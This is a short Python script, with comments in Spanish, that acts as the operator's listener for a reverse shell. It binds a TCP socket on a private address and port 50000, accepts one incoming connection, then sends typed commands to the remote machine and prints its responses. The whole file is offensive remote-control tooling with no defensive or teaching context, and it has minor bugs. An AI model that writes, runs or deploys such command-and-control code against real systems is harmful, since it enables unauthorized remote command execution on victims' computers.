import socket
import sys

def soc():
    #creando socket tcp
    global s
    global conn 
    global addr
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('192.168.1.107', 50000)
    print('starting server from {} on port 50000'.format(server_address))
    s.bind(server_address)
    s.listen(1)
    print('server running... waiting conections...')
    conn, addr = s.accept()
    print('connection recived from {}'.format(addr))
    s.close()


def shell():
    cur_dir = conn.recv(1024)
    while True:
        command = input('{}#~: '.format(cur_dir))
        if command == 'exit':
            conn.send(command)
            break
        else:
            conn.send(command)
            response = conn.recv(1024)
            print(response)

soc()
shell()

